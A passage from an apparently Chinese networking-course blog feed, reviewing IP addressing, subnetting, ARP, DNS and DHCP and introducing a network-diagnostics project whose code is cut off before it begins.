class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><br>还不太理解的地方：<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><br>下周学习计划：<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>_<br><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-emphasis">_</span><br></code></pre></td></tr></table></figure><hr><h2 id="🎉-总结">🎉 总结</h2><p>恭喜你完成第二周的学习！这一周我们深入学习了网络层的核心概念：</p><ul><li>✅ 掌握了IP地址体系和子网划分</li><li>✅ 理解了MAC地址和ARP协议</li><li>✅ 学会了端口和Socket编程</li><li>✅ 深入了解DNS和DHCP协议</li><li>✅ 编写了多个实用的网络工具</li></ul><p>这些知识是网络工程师的必备基础。在实际工作中，你会频繁地使用这些概念来：</p><ul><li>规划和分配IP地址</li><li>排查网络连通性问题</li><li>配置网络服务</li><li>开发网络应用</li></ul><p><strong>继续保持学习的热情，我们下周见！</strong> 🚀</p><hr><p><strong>记住</strong>：网络知识需要大量实践才能真正掌握。多动手、多实验、多思考！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>14天：第一阶段总结与综合实战</title>
    <link href="/2025/11/10/14%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E4%B8%8E%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/14%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93%E4%B8%8E%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1>第14天：第一阶段总结与综合实战</h1><blockquote><p>“前两周的学习为你打开了网络世界的大门，现在是时候检验学习成果了！”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>回顾第一阶段核心知识点</li><li>完成综合实战项目</li><li>掌握网络问题排查方法</li><li>为下一阶段做好准备</li></ul><hr><h2 id="1-第一阶段学习回顾（Day-1-13）">1. 第一阶段学习回顾（Day 1-13）</h2><h3 id="1-1-知识地图">1.1 知识地图</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">第一阶段：网络基础入门</span><br><span class="hljs-attribute">│</span><br><span class="hljs-attribute">├── 第1周：网络基础概念</span><br><span class="hljs-attribute">│   ├── Day 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">计算机网络概述</span><br><span class="hljs-attribute">│   │   ├── 什么是计算机网络</span><br><span class="hljs-attribute">│   │   ├── 网络的作用</span><br><span class="hljs-attribute">│   │   └── 网络连接检测工具</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   ├── Day 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">网络分类和拓扑</span><br><span class="hljs-attribute">│   │   ├── LAN/WAN/MAN</span><br><span class="hljs-attribute">│   │   ├── 五种拓扑结构</span><br><span class="hljs-attribute">│   │   └── 局域网扫描器</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   ├── Day 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">OSI七层模型</span><br><span class="hljs-attribute">│   │   ├── 七层模型详解</span><br><span class="hljs-attribute">│   │   ├── 数据封装过程</span><br><span class="hljs-attribute">│   │   └── 协议分层演示</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   ├── Day 4</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TCP/IP四层模型</span><br><span class="hljs-attribute">│   │   ├── TCP/IP vs OSI</span><br><span class="hljs-attribute">│   │   ├── 四层模型详解</span><br><span class="hljs-attribute">│   │   └── 数据包分析</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   ├── Day 5</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ping命令</span><br><span class="hljs-attribute">│   │   ├── ping原理</span><br><span class="hljs-attribute">│   │   ├── ICMP协议</span><br><span class="hljs-attribute">│   │   └── 简易ping工具</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   ├── Day 6</span><span class="hljs-punctuation">:</span> <span class="hljs-string">traceroute命令</span><br><span class="hljs-attribute">│   │   ├── traceroute原理</span><br><span class="hljs-attribute">│   │   ├── TTL字段</span><br><span class="hljs-attribute">│   │   └── traceroute工具</span><br><span class="hljs-attribute">│   │</span><br><span class="hljs-attribute">│   └── Day 7</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wireshark抓包</span><br><span class="hljs-attribute">│       ├── Wireshark基础</span><br><span class="hljs-attribute">│       ├── 过滤器语法</span><br><span class="hljs-attribute">│       └── HTTP请求分析</span><br><span class="hljs-attribute">│</span><br><span class="hljs-attribute">└── 第2周：网络层深入理解</span><br><span class="hljs-attribute">    ├── Day 8</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IP地址基础</span><br>    <span class="hljs-attribute">│   ├── IPv4地址结构</span><br><span class="hljs-attribute">    │   ├── IP地址分类</span><br><span class="hljs-attribute">    │   └── IP地址分析工具</span><br><span class="hljs-attribute">    │</span><br><span class="hljs-attribute">    ├── Day 9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">子网划分</span><br>    <span class="hljs-attribute">│   ├── 子网掩码</span><br><span class="hljs-attribute">    │   ├── CIDR表示法</span><br><span class="hljs-attribute">    │   └── 子网计算器</span><br><span class="hljs-attribute">    │</span><br><span class="hljs-attribute">    ├── Day 10</span><span class="hljs-punctuation">:</span> <span class="hljs-string">MAC地址和ARP</span><br>    <span class="hljs-attribute">│   ├── MAC地址结构</span><br><span class="hljs-attribute">    │   ├── ARP协议</span><br><span class="hljs-attribute">    │   └── ARP扫描工具</span><br><span class="hljs-attribute">    │</span><br><span class="hljs-attribute">    ├── Day 11</span><span class="hljs-punctuation">:</span> <span class="hljs-string">端口和Socket</span><br>    <span class="hljs-attribute">│   ├── 端口概念</span><br><span class="hljs-attribute">    │   ├── Socket基础</span><br><span class="hljs-attribute">    │   └── 端口扫描器</span><br><span class="hljs-attribute">    │</span><br><span class="hljs-attribute">    ├── Day 12</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DNS协议</span><br>    <span class="hljs-attribute">│   ├── DNS工作原理</span><br><span class="hljs-attribute">    │   ├── DNS查询流程</span><br><span class="hljs-attribute">    │   └── DNS查询工具</span><br><span class="hljs-attribute">    │</span><br><span class="hljs-attribute">    └── Day 13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">DHCP协议</span><br>        ├── DHCP原理<br>        ├── DORA四次握手<br>        └── DHCP分析工具<br></code></pre></td></tr></table></figure><hr><h2 id="2-核心知识点总结">2. 核心知识点总结</h2><h3 id="2-1-OSI七层模型-vs-TCP-IP四层模型">2.1 OSI七层模型 vs TCP/IP四层模型</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">OSI</span>七层模型              TCP/<span class="hljs-built_in">IP</span>四层模型        协议示例<br>┌────────────────┐<br>│  <span class="hljs-number">7</span>. 应用层      │      ┌──────────┐         HTTP, FTP, DNS<br>│  <span class="hljs-number">6</span>. 表示层      │──────│ 应用层    │         SMTP, SSH, Telnet<br>│  <span class="hljs-number">5</span>. 会话层      │      └──────────┘<br>├────────────────┤      ┌──────────┐<br>│  <span class="hljs-number">4</span>. 传输层      │──────│ 传输层    │         TCP, UDP<br>├────────────────┤      └──────────┘<br>│  <span class="hljs-number">3</span>. 网络层      │      ┌──────────┐<br>├────────────────┤──────│ 网络层    │         <span class="hljs-built_in">IP</span>, ICMP, ARP<br>│  <span class="hljs-number">2</span>. 数据链路层   │      └──────────┘<br>├────────────────┤      ┌──────────┐<br>│  <span class="hljs-number">1</span>. 物理层      │──────│ 链路层    │         Ethernet, WiFi<br>└────────────────┘      └──────────┘<br><br>数据封装过程：<br>应用数据<br>  → 添加TCP/UDP头（传输层）<br>    → 添加<span class="hljs-built_in">IP</span>头（网络层）<br>      → 添加以太网帧头/尾（链路层）<br>        → 转换为比特流（物理层）<br></code></pre></td></tr></table></figure><h3 id="2-2-IP地址和子网划分">2.2 IP地址和子网划分</h3><p><strong>IP地址分类</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">类别    范围                    默认掩码          用途<br>A    <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">126</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    /<span class="hljs-number">8</span> (<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>)        大型网络<br>B    <span class="hljs-number">128</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">191</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  /<span class="hljs-number">16</span> (<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>)     中型网络<br>C    <span class="hljs-number">192</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">223</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>  /<span class="hljs-number">24</span> (<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>)   小型网络<br><br>私有IP：<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>         (<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">10</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>      (<span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">172</span>.<span class="hljs-number">31</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>     (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>)<br><br>特殊IP：<br><span class="hljs-number">127.0.0.1</span>          环回地址（本机）<br><span class="hljs-number">0.0.0.0</span>            所有地址/未知地址<br><span class="hljs-number">255.255.255.255</span>    广播地址<br></code></pre></td></tr></table></figure><p><strong>子网划分快速计算</strong>：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">CIDR    掩码              主机数    子网数（从<span class="hljs-string">/24</span>划分）<br><span class="hljs-string">/24</span>     255.255.255.0     254       1<br><span class="hljs-string">/25</span>     255.255.255.128   126       2<br><span class="hljs-string">/26</span>     255.255.255.192   62        4<br><span class="hljs-string">/27</span>     255.255.255.224   30        8<br><span class="hljs-string">/28</span>     255.255.255.240   14        16<br><span class="hljs-string">/29</span>     255.255.255.248   6         32<br><span class="hljs-string">/30</span>     255.255.255.252   2         64（用于点对点）<br><br>主机数计算：2^<span class="hljs-params">(32-CIDR)</span> - 2<br></code></pre></td></tr></table></figure><h3 id="2-3-ARP协议">2.3 ARP协议</h3><p><strong>ARP工作流程</strong>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">场景：主机A (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>) 想发送数据给主机B (<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>)<br><br>步骤<span class="hljs-number">1</span>：检查<span class="hljs-variable constant_">ARP</span>缓存<br>    arp -a<br>    → 如果有B的<span class="hljs-variable constant_">MAC</span>地址，直接使用<br>    → 如果没有，进行<span class="hljs-variable constant_">ARP</span>请求<br><br>步骤<span class="hljs-number">2</span>：广播<span class="hljs-variable constant_">ARP</span>请求<br>    源<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (主机A)<br>    目标<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span> (广播)<br>    内容: <span class="hljs-string">&quot;谁是192.168.1.20？请告诉192.168.1.10&quot;</span><br><br>步骤<span class="hljs-number">3</span>：目标主机回应<br>    源<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span> (主机B)<br>    目标<span class="hljs-variable constant_">MAC</span>: <span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span> (主机A)<br>    内容: <span class="hljs-string">&quot;192.168.1.20是我，我的MAC是BB:BB:BB:BB:BB:BB&quot;</span><br><br>步骤<span class="hljs-number">4</span>：更新<span class="hljs-variable constant_">ARP</span>缓存<br>    <span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span> → <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span> (保存在缓存中)<br><br>步骤<span class="hljs-number">5</span>：发送数据<br>    现在可以直接发送数据了<br></code></pre></td></tr></table></figure><h3 id="2-4-DNS工作原理">2.4 DNS工作原理</h3><p><strong>DNS查询流程</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm">用户访问 www.example.com<br><br><span class="hljs-number">1</span>. 浏览器检查缓存<br>   浏览器缓存 → 操作系统缓存 → hosts文件<br><br><span class="hljs-number">2</span>. 如果缓存未命中，向本地DNS服务器查询<br>   客户端 → 本地DNS (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>)<br><br><span class="hljs-number">3</span>. 本地DNS递归查询<br>   ┌──────────────────────────────────────┐<br>   │ 本地DNS → 根DNS服务器 (.)            │<br>   │     <span class="hljs-string">&quot;example.com在哪？&quot;</span>              │<br>   │     ← <span class="hljs-string">&quot;去问.com的DNS服务器&quot;</span>          │<br>   │                                      │<br>   │ 本地DNS → .com顶级DNS                │<br>   │     <span class="hljs-string">&quot;example.com在哪？&quot;</span>              │<br>   │     ← <span class="hljs-string">&quot;去问example.com的权威DNS&quot;</span>     │<br>   │                                      │<br>   │ 本地DNS → example.com权威DNS         │<br>   │     <span class="hljs-string">&quot;www.example.com的IP是？&quot;</span>        │<br>   │     ← <span class="hljs-string">&quot;IP是93.184.216.34&quot;</span>            │<br>   └──────────────────────────────────────┘<br><br><span class="hljs-number">4</span>. 本地DNS返回结果给客户端<br><span class="hljs-symbol">   IP:</span> <span class="hljs-number">93</span>.<span class="hljs-number">184</span>.<span class="hljs-number">216</span>.<span class="hljs-number">34</span><br><br><span class="hljs-number">5</span>. 浏览器使用该<span class="hljs-built_in">IP</span>建立连接<br>   HTTP <span class="hljs-meta">GET</span> http:<span class="hljs-comment">//93.184.216.34/</span><br></code></pre></td></tr></table></figure><h3 id="2-5-DHCP工作原理">2.5 DHCP工作原理</h3><p><strong>DHCP四次握手（DORA）</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">D</span> - Discover  发现<br>O - Offer     提供<br>R - Request   请求<br>A - Ack       确认<br><br>场景：新电脑接入网络<br><br><span class="hljs-number">1</span>. DHCP Discover (广播)<br>   客户端: <span class="hljs-string">&quot;有DHCP服务器吗？我需要IP地址！&quot;</span><br>   源IP: <span class="hljs-number">0.0.0.0</span><br>   目标IP: <span class="hljs-number">255.255.255.255</span><br>   目标MAC: FF:FF:FF:FF:FF:FF<br><br><span class="hljs-number">2</span>. DHCP Offer (单播)<br>   服务器: <span class="hljs-string">&quot;我是DHCP服务器，可以给你192.168.1.100&quot;</span><br>   提供: IP=<span class="hljs-number">192.168.1.100</span>, 掩码=<span class="hljs-number">255.255.255.0</span>, 网关=<span class="hljs-number">192.168.1.1</span><br><br><span class="hljs-number">3</span>. DHCP Request (广播)<br>   客户端: <span class="hljs-string">&quot;我接受192.168.1.100这个地址&quot;</span><br>   （广播是为了告诉其他DHCP服务器这个IP被占用了）<br><br><span class="hljs-number">4</span>. DHCP Ack (单播)<br>   服务器: <span class="hljs-string">&quot;确认分配给你192.168.1.100，租期24小时&quot;</span><br>   包含: IP、掩码、网关、DNS、租期<br><br>配置完成！客户端现在可以上网了。<br></code></pre></td></tr></table></figure><hr><h2 id="3-综合实战项目：网络配置检测工具">3. 综合实战项目：网络配置检测工具</h2><h3 id="3-1-项目需求">3.1 项目需求</h3><p>创建一个命令行工具，能够：</p><ol><li>检测本机网络配置</li><li>测试网络连通性</li><li>DNS查询测试</li><li>生成诊断报告</li></ol><h3 id="3-2-代码实现">3.2 代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span 